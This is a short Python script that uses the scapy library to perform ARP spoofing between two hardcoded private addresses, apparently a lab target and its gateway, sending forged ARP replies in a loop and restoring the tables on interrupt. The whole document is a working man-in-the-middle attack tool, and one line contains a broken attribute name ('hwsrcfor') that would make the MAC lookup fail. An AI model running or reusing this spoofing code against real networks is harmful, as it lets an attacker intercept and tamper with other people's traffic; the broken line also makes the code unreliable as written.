#!/usr/bin/env python
import scapy.all as scapy
import time

def get_mac(IP):
    arp_request = scapy.ARP(pdst=IP)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')   
    arp_request_broadcast = broadcast/arp_request
    answered, _ = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)
    return answered[0][1].hwsrcfor

def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    packet.show()
    packet.summary()
    scapy.send(packet, verbose=False)

def restore(dstip, srcip):
    packet = scapy.ARP(op=2, pdst=dstip, hwdst=get_mac(dstip), psrc=srcip, hwsrc=get_mac(srcip))
    packet.show()
    packet.summary()
    scapy.send(packet, count=4, verbose=False)

try:
    count = 0
    while True:
            spoof('192.168.89.134', '192.168.89.2')
            spoof('192.168.89.2', '192.168.89.134')
            count += 2
            print('\r[+] Sent two packets, count: ' + str(count), end='') 
            time.sleep(2)
except KeyboardInterrupt: 
    restore('192.168.89.134', '192.168.89.2')
